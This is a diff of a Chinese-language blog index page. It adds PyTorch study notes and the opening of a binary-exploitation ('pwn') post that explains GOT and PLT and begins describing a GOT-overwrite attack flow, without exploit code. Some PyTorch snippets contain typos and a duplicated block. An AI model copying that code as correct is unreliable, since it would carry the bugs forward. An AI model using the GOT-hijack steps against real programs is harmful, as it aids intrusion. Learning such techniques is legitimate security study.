@@ -226,6 +226,224 @@
             
 
   
+    <article id="post-Pytorch学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/11/16/Pytorch%E5%AD%A6%E4%B9%A0/" target="_blank">Pytorch学习</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/11/16/Pytorch%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
+        <time datetime="2023-11-16T14:26:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-16</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <center>
+    Pytorch学习
+</center>
+
+<h1 id="Pytorch学习"><a href="#Pytorch学习" class="headerlink" title="Pytorch学习"></a>Pytorch学习</h1><p>[toc]</p>
+<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>查看package的相关内容函数</p>
+<ul>
+<li><code>dir()</code>：解包，显示库内所含的内容，显示内容为下划线开始的命名时，说明该内容为函数，可以使用</li>
+<li><code>help()</code>：可以显示该函数的使用方法和类型</li>
+</ul>
+<p>上述两幅图片分别是使用下两行代码运行的结果，其中help()要把函数的括号去掉</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(torch,cuda))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">help</span>(torch.cuda.is_available))</span><br></pre></td></tr></table></figure>
+
+<p><strong>注</strong>：在jupyter notebook中，<code>shift+enter</code>能够执行代码段，包名加<code>??</code>可以显示具体内容</p>
+<p>检测pytorch是否可运行GPU加速</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.device_count())</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.get_device_name(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available())</span><br></pre></td></tr></table></figure>
+
+<p><code>torch.stack((x,y),dim=0)</code>：可以将x和y<strong>增加维度</strong>的合并</p>
+<p><code>torch.cat((x,y),dim=0)</code>：可以将x和y<strong>不增加维度</strong>合并</p>
+<h3 id="基本运算"><a href="#基本运算" class="headerlink" title="基本运算"></a>基本运算</h3><p>pytorch与numpy之间数组的转换：<code>torch.from_numpy()</code></p>
+<p>定义张量：<code>torch.Tensor([3,4])</code></p>
+<p>定义浮点张量：<code>torch.FloatTensor([3,4])</code></p>
+<p>定义随机维度张量矩阵：<code>torch.randn(3,4)</code></p>
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907143426854.png" alt="image-20220907143426854"></p>
+<p>相关结果如上</p>
+<p>经过测试，tensor的访问与列表操作一直，也支持切片等操作</p>
+<p><strong>tensor与numpy之间的相互转换</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">np_tensor=np.random.randn(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(np_tensor)</span><br><span class="line">py_tensor=torch.from_numpy(np_tensor)</span><br><span class="line"><span class="built_in">print</span>(py_tensor)</span><br><span class="line">new_np_tensor=py_tensor.numpy()</span><br><span class="line"><span class="built_in">print</span>(new_np_tensor)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907144015333.png" alt="image-20220907144015333"></p>
+<h3 id="GPU-tensor与CPU-tensor相互转换"><a href="#GPU-tensor与CPU-tensor相互转换" class="headerlink" title="GPU tensor与CPU tensor相互转换"></a>GPU tensor与CPU tensor相互转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x=torch.randn(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">x_gpu=x.cuda(<span class="number">0</span>) <span class="comment"># 将x放在第一块GPU上进行运算</span></span><br><span class="line"><span class="built_in">print</span>(x_gpu)</span><br><span class="line">x_cpu=x_gpu.cpu() <span class="comment"># 将GPU的资源放到CPU上运算</span></span><br><span class="line"><span class="built_in">print</span>(x_cpu)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907144807419.png" alt="image-20220907144807419"></p>
+<p><strong>注意</strong>：只用CPU上的资源可以转换为numpy，直接将GPU转化为numpy会报错，因此需</p>
+<p><code>x_array=x_gpu.cpu().numpy()</code></p>
+<h3 id="Tensor操作"><a href="#Tensor操作" class="headerlink" title="Tensor操作"></a>Tensor操作</h3><h4 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x=torch.ones(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">y=torch.ones(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">z=torch.ones(<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line">k=x+<span class="number">3</span>             <span class="comment"># 矩阵与标量运算</span></span><br><span class="line">k=torch.add(x,<span class="number">3</span>)  <span class="comment"># 矩阵与矩阵运算</span></span><br><span class="line">k=torch.mm(x,z)   <span class="comment"># 矩阵与矩阵的乘法(叉乘),(1,2)*(2,3)=(1,3)</span></span><br><span class="line">k=torch.mul(x,y)  <span class="comment"># 矩阵与矩阵的点乘,(1,2).(1,2)=(1,2)</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="高级运算"><a href="#高级运算" class="headerlink" title="高级运算"></a>高级运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=torch.randn(<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(x.size())</span><br><span class="line"><span class="built_in">print</span>(x.shape)    <span class="comment"># 注意shape不带括号</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907160501930.png" alt="image-20220907160501930"></p>
+<p><strong>重新排列矩阵</strong></p>
+<p><code>x=x.view(3,4)</code>，<code>x=x.view(12)</code></p>
+<p>将上述生成4*3矩阵转换成3*4以及12维行向量</p>
+<p><strong>增加维度</strong></p>
+<p><code>torch.unsqueeze(x,dim=1)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">torch.unsqueeze(x,dim=<span class="number">1</span>)</span><br><span class="line">x=x.unsqueeze(<span class="number">1</span>)</span><br><span class="line">x.shape</span><br></pre></td></tr></table></figure>
+
+<p>此时输出结果为<code>torch.Size([4,1,3])</code></p>
+<p>若要减少维度可以使用<code>torch.squeeze(x,dim=1)</code></p>
+<p><strong>查询最大最小值</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">max_value,max_index=torch.<span class="built_in">max</span>(x,dim=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(max_value,max_index)</span><br><span class="line"><span class="comment"># 也可写成</span></span><br><span class="line">max_value,max_index=x.<span class="built_in">max</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>注意，<code>torch.max(x,dim=1)</code>函数，返回<strong>每一行</strong>的最大值与索引，先是值，后索引。并且0代表列，1代表行</p>
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907163024762.png" alt="image-20220907163024762"></p>
+<p><code>x.sum(0)</code>：输出每一列的和</p>
+<h3 id="Variable操作"><a href="#Variable操作" class="headerlink" title="Variable操作"></a>Variable操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line">x=Variable(torch.ones(<span class="number">2</span>,<span class="number">2</span>),</span><br><span class="line">           requires_grad=<span class="literal">True</span>)</span><br><span class="line">y=Variable(torch.ones(<span class="number">2</span>,<span class="number">2</span>),</span><br><span class="line">          requires_grad=<span class="literal">True</span>)</span><br><span class="line">z=torch.<span class="built_in">sum</span>(x+y)</span><br><span class="line"><span class="built_in">print</span>(z.data)</span><br><span class="line">z.backward()</span><br><span class="line"><span class="built_in">print</span>(x.grad)</span><br></pre></td></tr></table></figure>
+
+<p><code>requires_grad</code>参数表示是否需要对这个参数进行求导，对其使用<code>z.backward()</code>后，通过<code>x.grad</code>可访问具体值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x=Variable(torch.FloatTensor([<span class="number">2</span>]),requires_grad=<span class="literal">True</span>)<span class="comment"># []不可省略</span></span><br><span class="line">z=(x+<span class="number">2</span>)**<span class="number">2</span></span><br><span class="line">z.backward()</span><br><span class="line"><span class="built_in">print</span>(x.grad)</span><br><span class="line"><span class="built_in">print</span>(z.data)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907184809687.png" alt="image-20220907184809687"></p>
+<p>第一行表示该函数导数在x&#x3D;2的值，第二行表示该函数在x&#x3D;2的值</p>
+<h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><h3 id="线性模型"><a href="#线性模型" class="headerlink" title="线性模型"></a>线性模型</h3><table>
+<thead>
+<tr>
+<th align="center">时间</th>
+<th align="center">成绩</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2</td>
+<td align="center">3</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">5</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">8</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">?</td>
+</tr>
+</tbody></table>
+<p>$$<br>\hat{y_i}&#x3D;wx_i+b<br>$$</p>
+<p>其中$\hat{y_i}$表示预测的结果，$y_i$表示真实的结果，误差即为<br>$$<br>\frac{1}{n}\sum^n_{i&#x3D;1}(\hat{y_i}-y)^2<br>$$<br>模型通过该loss，修改$wi$和$b$的值，使得loss越接近于零，引入梯度下降概念</p>
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907190730630.png" alt="image-20220907190730630"><br>$$<br>w&#x3D;w-\eta\frac{\delta loss}{\delta w}<br>$$<br>$\eta$即为学习率，通过代码显示即为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">liner_model</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> w*x+b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_loss</span>(<span class="params">y_,y</span>):</span><br><span class="line">    <span class="keyword">return</span> torch.mean((y_-y)**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">w=Variable(torch.randn(<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line">b=Variable(torch.randn(<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line">x_train=torch.FloatTensor([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>])</span><br><span class="line">y_train=torch.FloatTensor([<span class="number">5.1</span>,<span class="number">5.95</span>,<span class="number">7.2</span>,<span class="number">8.02</span>,<span class="number">8.99</span>,<span class="number">10.05</span>,<span class="number">11.15</span>,<span class="number">12.03</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    y_=liner_model(x_train)</span><br><span class="line">    loss=get_loss(y_,y_train)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    loss.backward()</span><br><span class="line"></span><br><span class="line">    w.data=w.data-<span class="number">1e-2</span>*w.grad.data</span><br><span class="line">    b.data=b.data-<span class="number">1e-2</span>*b.grad.data</span><br><span class="line">    <span class="comment">#保险起见推荐用下表述，上述表述新起了一个变量暂存w，可能会丢失Variable的属性，但实测高版本无影响</span></span><br><span class="line">    <span class="comment">#w.data-=1e-2*w.grad.data</span></span><br><span class="line">    <span class="comment">#b.data-=1e-1*b.grad.data</span></span><br><span class="line">    w.grad.zero_()<span class="comment"># 梯度归零</span></span><br><span class="line">    b.grad.zero_()</span><br><span class="line">    <span class="built_in">print</span>(w.data,b.data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;w:&quot;</span>,w.data,<span class="string">&quot;b:&quot;</span>,b.data,<span class="string">&quot;predict:&quot;</span>,<span class="number">9</span>*w.data+b.data)</span><br></pre></td></tr></table></figure>
+
+<p>其中，每次迭代需要将梯度归零，这里经过查阅资料发现，需要将清零操作放置在梯度下降后，输出结果如下</p>
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907194325799.png" alt="image-20220907194325799"></p>
+<p>假象解为w&#x3D;1,b&#x3D;4，经过实际测试发现，与随机初始的w,b值有关，以及跟学习率的大小也很相关（炼丹玄学）</p>
+<h3 id="Logistic回归模型"><a href="#Logistic回归模型" class="headerlink" title="Logistic回归模型"></a>Logistic回归模型</h3><p>针对分类问题<br>$$<br>\hat{y_i}&#x3D;\sigma(w_ix+b)<br>$$<br>其与线性回归唯一不同，多了个sigmoid函数，范围在0~1之间，常常处理二分类问题，因为其二值化的值域可以有效的进行二分类的区分（0到1的概率）<br>$$<br>\sigma(x)&#x3D;\frac{1}{1+e^{-x}}<br>$$<br>其loss函数相较于线性模型更加的复杂<br>$$<br>loss&#x3D;-\frac{1}{n}\sum^n_{i&#x3D;1}(y_ilog\hat{y_i}+(1-y_i)log(1-\hat{y_i}))<br>$$<br><strong>注意</strong>：在二分类问题中，$y_i$只有0和1两个取值，因为其真实结果是确定的</p>
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220907195524175.png" alt="image-20220907195524175"></p>
+<p>对于如该点图分布，使用逻辑斯蒂回归进行二分类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sigmoid</span>(<span class="params">x</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>/(<span class="number">1</span>+np.exp(-x))</span><br><span class="line"><span class="comment"># 或者直接使用pytorch内置的sigmod函数</span></span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line">F.sigmoid()</span><br><span class="line">w=Variable(torch.randn(<span class="number">2</span>,<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line">b=Variable(torch.zeros(<span class="number">1</span>),requires_grad=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logistic_regression</span>(<span class="params">x</span>):</span><br><span class="line">	<span class="keyword">return</span> F.sigmoid(torch.mm(x,w)+b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_loss</span>(<span class="params">y_pred,y</span>):</span><br><span class="line">    logits=(y*y_pred.clamp(<span class="number">1e-12</span>).log()+(<span class="number">1</span>-y)*(<span class="number">1</span>-y_pred).clamp(<span class="number">1e-12</span>).log()).mean()</span><br><span class="line">    <span class="keyword">return</span> logits</span><br></pre></td></tr></table></figure>
+
+<p>其中，该数学表达式可写成<br>$$<br>\hat{y}&#x3D;\sigma(w_1x+w_2y+b)<br>$$<br>上述仅适合于少量参数情况下，如果参数上百个之多，便需要使用优化器来迭代梯度</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line">w=nn.Parameter(torch.randn(<span class="number">2</span>,<span class="number">1</span>))</span><br><span class="line">b=nn.Parameter(torch.zeros(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logistic_regression</span>(<span class="params">x</span>):</span><br><span class="line">	<span class="keyword">return</span> F.sigmoid(torch.mm(x,w)+b)</span><br><span class="line"></span><br><span class="line">optimizer=torch.optim.SGD([w,b],lr=<span class="number">1.</span>)</span><br><span class="line">optimizer.zero_grad()<span class="comment">#使用优化器将梯度归零</span></span><br><span class="line">loss.backward()</span><br><span class="line">optimizer.step()<span class="comment"># 使用优化器来更新参数</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="多层神经网络"><a href="#多层神经网络" class="headerlink" title="多层神经网络"></a>多层神经网络</h3><p>应对复杂问题，可以在输入和输出之间嵌套多个线性层和激活函数（即隐含层）。</p>
+<p><img src="/../images/Pytorch%E5%AD%A6%E4%B9%A0.assets/image-20220908162527401.png" alt="image-20220908162527401"></p>
+<p><strong>为什么加激活函数？</strong></p>
+<p>对于一个两层神经网络：<br>$$<br>y&#x3D;w_2\sigma(w_1x)<br>$$<br>若不加激活函数$\sigma$，该网络将变成单一线性网络<br>$$<br>y&#x3D;w_n\dots w_1x&#x3D;\hat{w}x<br>$$</p>
+<h4 id="多层神经网络的写法"><a href="#多层神经网络的写法" class="headerlink" title="多层神经网络的写法"></a>多层神经网络的写法</h4><p>一般分为<strong>Sequential</strong>和<strong>Module</strong>两类，其中Module的写法更为灵活，因为Module可以使用Sequential</p>
+<p>一些注意事项：</p>
+<ul>
+<li>sigmoid等等函数集成在了torch.sigmoid位置，老版本还在F中</li>
+<li>套用变量时候需要Variable(torch.from_numpy(x).float())，时刻注意tensor和numpy的转换</li>
+<li>jupyter notebook似乎可以保存上次的参数继续训练</li>
+<li>在一些浅层的tanh网络中，学习率可以稍微设大一点。</li>
+<li>网络的设置把握好欠拟合和过拟合的度</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seq_net = nn.Sequential(</span><br><span class="line">    nn.Linear(<span class="number">2</span>, <span class="number">4</span>), </span><br><span class="line">    nn.Tanh(),</span><br><span class="line">    nn.Linear(<span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(seq_net[<span class="number">0</span>])</span><br><span class="line">w0=seq_net[<span class="number">0</span>].weight</span><br><span class="line"><span class="built_in">print</span>(w0)</span><br><span class="line">param=seq_net.parameters()</span><br><span class="line">optim=torch.optim.SGD(param,<span class="number">5e-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>):</span><br><span class="line">    out = seq_net(Variable(x))</span><br><span class="line">    loss = criterion(out, Variable(y))</span><br><span class="line">    optim.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    optim.step()</span><br><span class="line">    <span class="keyword">if</span> (e + <span class="number">1</span>) % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;epoch: &#123;&#125;, loss: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(e+<span class="number">1</span>, loss.data))</span><br></pre></td></tr></table></figure>
+
+<p>上为Sequential()方式定义网络</p>
+<p>下为Module类的方式定义网络</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">module_net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,numb_perlayer</span>):</span><br><span class="line">        <span class="built_in">super</span>(module_net,self).__init__()</span><br><span class="line">        self.layer1=nn.Linear(numb_perlayer[<span class="number">0</span>],numb_perlayer[<span class="number">1</span>])</span><br><span class="line">        self.layer2=nn.Tanh()</span><br><span class="line">        self.layer3=nn.Linear(numb_perlayer[<span class="number">1</span>],numb_perlayer[<span class="number">2</span>])</span><br><span class="line">        self.layer4=nn.Tanh()</span><br><span class="line">        self.layer5=nn.Linear(numb_perlayer[<span class="number">2</span>],numb_perlayer[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,x</span>):</span><br><span class="line">        x=self.layer1(x)</span><br><span class="line">        x=self.layer2(x)</span><br><span class="line">        x=self.layer3(x)</span><br><span class="line">        x=self.layer4(x)</span><br><span class="line">        x=self.layer5(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">optim = torch.optim.SGD(mo_net.parameters(), <span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30000</span>):</span><br><span class="line">    out = mo_net(Variable(x))</span><br><span class="line">    loss = criterion(out, Variable(y))</span><br><span class="line">    optim.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    optim.step()</span><br><span class="line">    <span class="keyword">if</span> (e + <span class="number">1</span>) % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;epoch: &#123;&#125;, loss: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(e+<span class="number">1</span>, loss.data))</span><br></pre></td></tr></table></figure>
+
+<p>同样也有两种保存训练好的模型的方式</p>
+<ul>
+<li><code>torch.save(seq_net,&quot;save_seq_net.pth&quot;)</code>：该方式会将网络的模型也保存下来</li>
+<li><code>torch.save(seq_net.state_dict().&quot;save_seq_net_params.pth&quot;)</code>：该方式仅保存参数而不保存模型结构</li>
+</ul>
+<p>同样，调用时候，第一种直接<code>torch.load(&quot;xxx.pth&quot;)</code>，而第二种先完整定义网络，再导入参数<code>seq_net2.load_state_dict(torch.load(&quot;xxx.pth&quot;))</code></p>
+<p>推荐在项目开头，设定随机种子进行使用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setup_seed</span>(<span class="params">seed</span>):</span><br><span class="line">    <span class="comment">#random.seed(seed)</span></span><br><span class="line">    np.random.seed(seed)</span><br><span class="line">    torch.manual_seed(seed)</span><br><span class="line">    torch.cuda.manual_seed(seed)</span><br><span class="line">    torch.cuda.manual_seed_all(seed)</span><br><span class="line">    torch.backends.cudnn.benchmark = <span class="literal">False</span></span><br><span class="line">    torch.backends.cudnn.deterministic = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">setup_seed(<span class="number">123</span>)<span class="keyword">def</span> <span class="title function_">setup_seed</span>(<span class="params">seed</span>):</span><br><span class="line">    <span class="comment">#random.seed(seed)</span></span><br><span class="line">    np.random.seed(seed)</span><br><span class="line">    torch.manual_seed(seed)</span><br><span class="line">    torch.cuda.manual_seed(seed)</span><br><span class="line">    torch.cuda.manual_seed_all(seed)</span><br><span class="line">    torch.backends.cudnn.benchmark = <span class="literal">False</span></span><br><span class="line">    torch.backends.cudnn.deterministic = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">setup_seed(<span class="number">123</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="多分类问题"><a href="#多分类问题" class="headerlink" title="多分类问题"></a>多分类问题</h3><p>网络仍为线性层，但是最后不使用sigmoid()函数，而是使用<strong>softmax函数</strong>进行多分类的概率匹配<br>$$<br>softmax(z_i)&#x3D;\frac{e^{z_j}}{\sum^k_{j&#x3D;1}e^{z_j}}<br>$$<br>同时，对于多分类下的Loss函数，我们也需要探求一般性计算公式以匹配任意多分类问题，即<strong>交叉熵</strong><br>$$<br>CrossEntropy(p,q)&#x3D;-\frac{1}{m}\sum_xp(x)log\space q(x)<br>$$<br>可以看出，二分类问题的loss也是该公式的变种</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">neural network</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/11/16/Pytorch%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-basic-pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -257,6 +475,44 @@
     
     <center>pwn从0开始</center>
 
+<p>文章开始前，增加一个辅助视频以帮助了解基本堆栈结构和C语言程序运行时候的状态。</p>
+<p><video src="../images/basic-pwn.assets/C语言程序的运行时结构.mp4" width = "600" height = "400"></video></p>
+<p>同时，补充一些基本知识</p>
+<p><strong>GOT和PLT</strong></p>
+<ul>
+<li>GOT：全局偏移量表，位于程序的数据段，每个条目8字节，用来存储外部函数（动态链接过来的那些函数）在内存里面的地址，可以在程序运行中被修改，这是因为默认情况下程序只有在需要调用时才导入函数，而不是在一开始就把所有需要用到的函数全部放进表里面。</li>
+<li>PLT：过程链接表：位于程序的代码段，每个条目16字节，前两条是特殊条目，分别用于跳转到动态链接器和记录系统启动函数，其余的条目负责调用一个具体的函数（存储外部函数的入口点，也就是这个函数在GOT表的位置）</li>
+<li>攻击流程：<ul>
+<li>确定printf函数在GOT表中的位置：程序在正常执行调用printf函数时通过PLT表跳转到GOT表的指定条目，此时可以通过对应的汇编指令看到这个位置（当然这样一来printf函数在内存中的实际地址也能知道）</li>
